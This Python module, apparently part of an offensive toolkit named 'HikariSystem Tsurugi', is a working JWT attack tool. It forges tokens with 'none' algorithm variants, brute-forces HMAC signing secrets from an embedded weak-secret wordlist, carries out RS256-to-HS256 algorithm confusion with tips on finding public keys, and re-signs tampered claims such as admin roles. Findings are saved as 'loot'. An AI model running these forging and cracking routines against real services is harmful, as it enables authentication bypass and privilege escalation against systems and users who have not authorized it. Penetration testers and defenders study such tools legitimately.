# HikariSystem Tsurugi/modules/jwt_attack.py
"""
JWT ATTACK MODULE
Comprehensive JWT analysis and exploitation toolkit
Supports: Decode, None Algorithm, Weak Secret, Algorithm Confusion, Claim Tampering
"""
import json
import base64
import hmac
import hashlib
import re
from typing import Dict, List, Optional, Tuple
from datetime import datetime
from core.ui import console, log_info, log_success, log_warning, log_error
from core.logger import save_loot
from rich.panel import Panel
from rich.table import Table
from rich.syntax import Syntax

# Common weak secrets for bruteforce
WEAK_SECRETS = [
    # Top common
    "secret", "password", "123456", "admin", "key", "jwt", "token",
    "secret123", "password123", "secret_key", "jwt_secret", "api_key",
    "supersecret", "mysecret", "changeme", "letmein", "welcome",
    
    # Company/tech related
    "development", "production", "staging", "test", "debug",
    "apikey", "api_secret", "access_token", "auth_secret",
    "jwt_secret_key", "token_secret", "signing_key", "private_key",
    
    # Common patterns
    "123456789", "12345678", "1234567890", "qwerty", "abc123",
    "password1", "admin123", "root", "toor", "pass", "pass123",
    
    # Framework defaults
    "your-256-bit-secret", "your-secret-key", "change-me",
    "AllYourBase", "keyboard cat", "shhhhh", "secret!",
    "thisisnotasecurekey", "insecure", "notsecure",
    
    # Random patterns
    "HS256", "RS256", "none", "null", "undefined", "true", "false",
    "1", "0", "", " ", "a", "aaa", "test", "testing",
    
    # More patterns
    "gfhjkm", "qwertyuiop", "asdfghjkl", "zxcvbnm",
    "!@#$%^&*()", "p@ssw0rd", "P@ssword1", "Admin@123",
    
    # Company name patterns (common in real-world)
    "company", "company123", "companyapi", "companyjwt",
    "backend", "frontend", "mobile", "app", "webapp",
    "secure", "security", "auth", "authentication",
]


def b64_decode(data: str) -> bytes:
    """Base64 URL-safe decode with padding fix."""
    # Add padding if needed
    padding = 4 - len(data) % 4
    if padding != 4:
        data += "=" * padding
    return base64.urlsafe_b64decode(data)


def b64_encode(data: bytes) -> str:
    """Base64 URL-safe encode without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def parse_jwt(token: str) -> Tuple[dict, dict, str]:
    """
    Parse JWT into header, payload, and signature.
    
    Returns:
        (header_dict, payload_dict, signature_b64)
    """
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError(f"Invalid JWT format: expected 3 parts, got {len(parts)}")
    
    try:
        header = json.loads(b64_decode(parts[0]))
        payload = json.loads(b64_decode(parts[1]))
        signature = parts[2]
    except Exception as e:
        raise ValueError(f"Failed to decode JWT: {e}")
    
    return header, payload, signature


def sign_jwt(header: dict, payload: dict, secret: str, algorithm: str = "HS256") -> str:
    """
    Sign a JWT with given secret.
    
    Supports: HS256, HS384, HS512, none
    """
    header["alg"] = algorithm
    
    header_b64 = b64_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64_encode(json.dumps(payload, separators=(",", ":")).encode())
    
    message = f"{header_b64}.{payload_b64}"
    
    if algorithm.lower() == "none":
        return f"{message}."
    
    # HMAC algorithms
    if algorithm == "HS256":
        sig = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
    elif algorithm == "HS384":
        sig = hmac.new(secret.encode(), message.encode(), hashlib.sha384).digest()
    elif algorithm == "HS512":
        sig = hmac.new(secret.encode(), message.encode(), hashlib.sha512).digest()
    else:
        raise ValueError(f"Unsupported algorithm: {algorithm}")
    
    signature = b64_encode(sig)
    return f"{message}.{signature}"


def verify_signature(token: str, secret: str) -> bool:
    """Verify if JWT signature matches with given secret."""
    try:
        header, payload, original_sig = parse_jwt(token)
        algorithm = header.get("alg", "HS256")
        
        if algorithm.lower() == "none":
            return True
        
        # Re-sign and compare
        new_token = sign_jwt(header, payload, secret, algorithm)
        _, _, new_sig = parse_jwt(new_token)
        
        return new_sig == original_sig
    except:
        return False


# ═══════════════════════════════════════════════════════════════════════════════
#  JWT ATTACKS
# ═══════════════════════════════════════════════════════════════════════════════

def decode_jwt_full(token: str) -> Dict:
    """
    Fully decode and analyze a JWT token.
    
    Returns:
        dict with header, payload, analysis
    """
    try:
        header, payload, signature = parse_jwt(token)
    except ValueError as e:
        return {"error": str(e)}
    
    # Analyze expiration
    exp = payload.get("exp")
    iat = payload.get("iat")
    nbf = payload.get("nbf")
    
    expiry_status = "No expiration"
    if exp:
        exp_time = datetime.fromtimestamp(exp)
        now = datetime.now()
        if exp_time < now:
            expiry_status = f"EXPIRED ({exp_time.strftime('%Y-%m-%d %H:%M')})"
        else:
            delta = exp_time - now
            expiry_status = f"Valid for {delta.days}d {delta.seconds//3600}h"
    
    # Identify interesting claims
    interesting_claims = []
    privilege_claims = ["admin", "is_admin", "isAdmin", "role", "roles", 
                        "permissions", "scope", "scopes", "groups", "privileges"]
    
    for claim in privilege_claims:
        if claim in payload:
            interesting_claims.append(f"{claim}: {payload[claim]}")
    
    return {
        "header": header,
        "payload": payload,
        "signature": signature,
        "algorithm": header.get("alg", "unknown"),
        "expiry": expiry_status,
        "interesting_claims": interesting_claims,
        "subject": payload.get("sub"),
        "issuer": payload.get("iss"),
    }


def attack_none_algorithm(token: str) -> Dict:
    """
    Try the 'none' algorithm attack.
    
    Changes algorithm to 'none' and removes signature.
    Works on misconfigured servers that don't properly validate algorithm.
    """
    try:
        header, payload, _ = parse_jwt(token)
    except ValueError as e:
        return {"success": False, "error": str(e)}
    
    # Create forged token with none algorithm
    original_alg = header.get("alg")
    
    # Try different variations
    none_variants = ["none", "None", "NONE", "nOnE"]
    forged_tokens = []
    
    for variant in none_variants:
        forged = sign_jwt(header.copy(), payload, "", variant)
        forged_tokens.append({
            "variant": variant,
            "token": forged
        })
    
    # Also try with empty signature but original alg
    header_b64 = b64_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64_encode(json.dumps(payload, separators=(",", ":")).encode())
    empty_sig_token = f"{header_b64}.{payload_b64}."
    
    forged_tokens.append({
        "variant": "empty_signature",
        "token": empty_sig_token
    })
    
    return {
        "success": True,
        "original_algorithm": original_alg,
        "forged_tokens": forged_tokens,
        "note": "Test these tokens against the target. If any work, the server is vulnerable."
    }


def bruteforce_secret(token: str, wordlist: List[str] = None, verbose: bool = False) -> Dict:
    """
    Bruteforce JWT secret using common passwords.
    
    Args:
        token: JWT to crack
        wordlist: Custom wordlist (uses WEAK_SECRETS if None)
        verbose: Show progress
        
    Returns:
        dict with success status and found secret
    """
    wordlist = wordlist or WEAK_SECRETS
    
    try:
        header, payload, signature = parse_jwt(token)
    except ValueError as e:
        return {"success": False, "error": str(e)}
    
    algorithm = header.get("alg", "HS256")
    
    # Only works for HMAC algorithms
    if not algorithm.startswith("HS"):
        return {
            "success": False,
            "error": f"Bruteforce only works for HMAC algorithms, got {algorithm}",
            "suggestion": "Try algorithm confusion attack for RSA"
        }
    
    log_info(f"Bruteforcing {len(wordlist)} secrets...")
    
    for i, secret in enumerate(wordlist):
        if verify_signature(token, secret):
            return {
                "success": True,
                "secret": secret,
                "algorithm": algorithm,
                "attempts": i + 1,
                "message": f"Secret found after {i+1} attempts!"
            }
        
        if verbose and i % 100 == 0:
            console.print(f"[dim]Tested {i}/{len(wordlist)}...[/dim]")
    
    return {
        "success": False,
        "attempts": len(wordlist),
        "message": "Secret not found in wordlist"
    }


def attack_algorithm_confusion(token: str, public_key: str = None) -> Dict:
    """
    Algorithm Confusion Attack (CVE-2015-9235).
    
    If server uses RS256 but accepts HS256, we can sign with the public key.
    The server will verify with the public key treating it as HMAC secret.
    """
    try:
        header, payload, _ = parse_jwt(token)
    except ValueError as e:
        return {"success": False, "error": str(e)}
    
    original_alg = header.get("alg", "")
    
    # Only applicable for RSA algorithms
    if not original_alg.startswith("RS") and not original_alg.startswith("ES"):
        return {
            "success": False,
            "applicable": False,
            "error": f"Algorithm confusion requires RSA/ECDSA token, got {original_alg}",
            "suggestion": "This attack only works on RS256/RS384/RS512 tokens"
        }
    
    if not public_key:
        return {
            "success": False,
            "applicable": True,
            "error": "Public key required for this attack",
            "how_to_get": [
                "Check /.well-known/jwks.json",
                "Check /oauth/jwks",
                "Extract from certificate",
                "Check API documentation"
            ]
        }
    
    # Sign with public key as HS256 secret
    header_modified = header.copy()
    header_modified["alg"] = "HS256"
    
    forged = sign_jwt(header_modified, payload, public_key, "HS256")
    
    return {
        "success": True,
        "applicable": True,
        "original_algorithm": original_alg,
        "forged_algorithm": "HS256",
        "forged_token": forged,
        "note": "Server must accept HS256 and use the public key for verification"
    }


def tamper_claims(token: str, modifications: Dict, secret: str) -> Dict:
    """
    Modify JWT claims and re-sign.
    
    Args:
        token: Original JWT
        modifications: Claims to change (e.g., {"admin": True, "role": "admin"})
        secret: Secret to sign with (must be known)
        
    Returns:
        New forged token with modified claims
    """
    try:
        header, payload, _ = parse_jwt(token)
    except ValueError as e:
        return {"success": False, "error": str(e)}
    
    # Apply modifications
    original_payload = payload.copy()
    payload.update(modifications)
    
    algorithm = header.get("alg", "HS256")
    
    try:
        forged = sign_jwt(header, payload, secret, algorithm)
    except Exception as e:
        return {"success": False, "error": f"Failed to sign: {e}"}
    
    return {
        "success": True,
        "original_claims": original_payload,
        "modified_claims": payload,
        "changes": modifications,
        "forged_token": forged
    }


# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN SCAN FUNCTION
# ═══════════════════════════════════════════════════════════════════════════════

def run_jwt_attack(
    token: str,
    decode_only: bool = False,
    crack: bool = False,
    attack_none: bool = False,
    tamper: str = None,
    secret: str = None,
    public_key: str = None,
    wordlist_file: str = None
) -> Dict:
    """
    Run comprehensive JWT analysis and attacks.
    
    Args:
        token: JWT token to analyze
        decode_only: Only decode, no attacks
        crack: Bruteforce secret
        attack_none: Try none algorithm attack
        tamper: Claims to modify (format: "key1=value1,key2=value2")
        secret: Known secret for tampering/verification
        public_key: Public key for algorithm confusion
        wordlist_file: Custom wordlist path
    """
    console.print(f"\n[bold magenta][*] JWT ATTACK MODULE[/bold magenta]")
    console.print(f"[dim]Token: {token[:50]}...[/dim]")
    
    results = {"token": token}
    
    # Step 1: Decode
    log_info("Decoding JWT...")
    decoded = decode_jwt_full(token)
    
    if "error" in decoded:
        log_error(f"Decode failed: {decoded['error']}")
        return {"success": False, "error": decoded["error"]}
    
    results["decoded"] = decoded
    
    # Display decoded info
    console.print(Panel(
        Syntax(json.dumps(decoded["header"], indent=2), "json", theme="monokai"),
        title="[bold cyan]HEADER[/bold cyan]",
        border_style="cyan"
    ))
    
    console.print(Panel(
        Syntax(json.dumps(decoded["payload"], indent=2), "json", theme="monokai"),
        title="[bold cyan]PAYLOAD[/bold cyan]",
        border_style="cyan"
    ))
    
    # Show analysis
    table = Table(title="JWT Analysis", border_style="blue")
    table.add_column("Property", style="bold")
    table.add_column("Value")
    
    table.add_row("Algorithm", decoded["algorithm"])
    table.add_row("Expiry", decoded["expiry"])
    table.add_row("Subject", str(decoded.get("subject", "N/A")))
    table.add_row("Issuer", str(decoded.get("issuer", "N/A")))
    
    if decoded["interesting_claims"]:
        table.add_row("Interesting Claims", "\n".join(decoded["interesting_claims"]))
    
    console.print(table)
    
    if decode_only:
        return results
    
    # Step 2: Attacks
    attacks_run = []
    vulns_found = []
    
    # Check if secret is known
    if secret:
        log_info(f"Testing provided secret: {secret}")
        if verify_signature(token, secret):
            log_success("Secret is valid!")
            results["secret_valid"] = True
        else:
            log_warning("Secret does not match signature")
            results["secret_valid"] = False
    
    # Attack: Bruteforce
    if crack or (not decode_only and not attack_none and not tamper):
        log_info("Running weak secret bruteforce...")
        
        wordlist = WEAK_SECRETS
        if wordlist_file:
            try:
                with open(wordlist_file) as f:
                    wordlist = [line.strip() for line in f if line.strip()]
                log_info(f"Loaded {len(wordlist)} words from {wordlist_file}")
            except:
                log_warning("Failed to load wordlist, using default")
        
        crack_result = bruteforce_secret(token, wordlist)
        results["bruteforce"] = crack_result
        attacks_run.append("Weak Secret Bruteforce")
        
        if crack_result["success"]:
            log_success(f"[CRITICAL] Secret found: {crack_result['secret']}")
            vulns_found.append(("WEAK_SECRET", crack_result["secret"]))
            secret = crack_result["secret"]  # Use for further attacks
    
    # Attack: None Algorithm
    if attack_none or (not decode_only and decoded["algorithm"] != "none"):
        log_info("Trying None Algorithm attack...")
        
        none_result = attack_none_algorithm(token)
        results["none_algorithm"] = none_result
        attacks_run.append("None Algorithm")
        
        if none_result["success"]:
            log_warning("[!] None Algorithm tokens generated")
            console.print("[yellow]Test these tokens against the target:[/yellow]")
            for ft in none_result["forged_tokens"][:3]:
                console.print(f"  [{ft['variant']}]: {ft['token'][:60]}...")
    
    # Attack: Algorithm Confusion
    if decoded["algorithm"].startswith("RS"):
        log_info("Token uses RSA - Algorithm Confusion may apply")
        
        if public_key:
            confusion_result = attack_algorithm_confusion(token, public_key)
            results["algorithm_confusion"] = confusion_result
            attacks_run.append("Algorithm Confusion")
            
            if confusion_result["success"]:
                log_warning("[!] Algorithm Confusion token generated")
                console.print(f"[yellow]Forged token: {confusion_result['forged_token'][:60]}...[/yellow]")
        else:
            console.print("[dim]Provide --public-key to try algorithm confusion[/dim]")
    
    # Attack: Claim Tampering
    if tamper and secret:
        log_info(f"Tampering claims: {tamper}")
        
        # Parse tamper string
        mods = {}
        for pair in tamper.split(","):
            if "=" in pair:
                k, v = pair.split("=", 1)
                # Try to parse as JSON value
                try:
                    v = json.loads(v.lower())  # handles true/false/null
                except:
                    pass
                mods[k.strip()] = v
        
        if mods:
            tamper_result = tamper_claims(token, mods, secret)
            results["tamper"] = tamper_result
            attacks_run.append("Claim Tampering")
            
            if tamper_result["success"]:
                log_success("[!] Forged token with modified claims:")
                console.print(f"[green]{tamper_result['forged_token']}[/green]")
                vulns_found.append(("CLAIM_TAMPERING", tamper_result["forged_token"]))
    elif tamper and not secret:
        log_warning("Cannot tamper claims without known secret. Use --crack first or provide --secret")
    
    # Summary
    console.print(f"\n[bold]Attacks Run:[/bold] {', '.join(attacks_run) if attacks_run else 'None'}")
    
    if vulns_found:
        console.print(Panel(
            "\n".join([f"[bold]{v[0]}[/bold]: {v[1]}" for v in vulns_found]),
            title="[bold red]⚠ VULNERABILITIES FOUND[/bold red]",
            border_style="red"
        ))
        
        # Save to loot
        save_loot("jwt", "token_analysis", {
            "token": token[:50] + "...",
            "vulnerabilities": [{"type": v[0], "detail": v[1]} for v in vulns_found],
            "decoded": decoded
        })
    
    return results
